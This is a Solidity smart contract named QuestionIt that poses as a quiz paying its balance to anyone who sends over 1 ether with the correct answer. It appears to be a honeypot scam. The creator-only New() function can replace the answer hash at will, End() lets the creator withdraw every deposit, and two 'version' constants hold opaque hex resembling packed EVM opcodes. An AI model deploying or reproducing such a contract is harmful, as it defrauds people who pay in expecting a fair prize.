1 pragma solidity ^0.4.24;
2 
3 contract QuestionIt
4 {
5     bytes32 responseHash;
6     string public Question;
7     address questionSender;
8 
9     function Answer(string answer)
10     public payable {
11         if (responseHash == keccak256(answer) && msg.value > 1 ether) {
12             msg.sender.transfer(address(this).balance);
13         }
14     }
15  
16     function Begin(string question, string response)
17     public payable {
18         if (responseHash == 0x0) {
19             responseHash = keccak256(response);
20             Question = question;
21             questionSender = msg.sender;
22         }
23     }
24 
25     function End()
26     public payable {
27         if (msg.sender == questionSender) {
28             msg.sender.transfer(address(this).balance);
29         }
30     }
31 
32     function New(string question, bytes32 _responseHash)
33     public payable {
34         if (msg.sender == questionSender) {
35             Question = question;
36             responseHash = _responseHash;
37         }
38     }
39 
40     function () public payable { }
41     uint256 versionMin = 0x006326e3367063c8166a8a6304858fef6363e3fbbd;
42     uint256 versionMaj = 0x00633e3ee859631f1c827f63f50ab247633fad9ae0;
43 }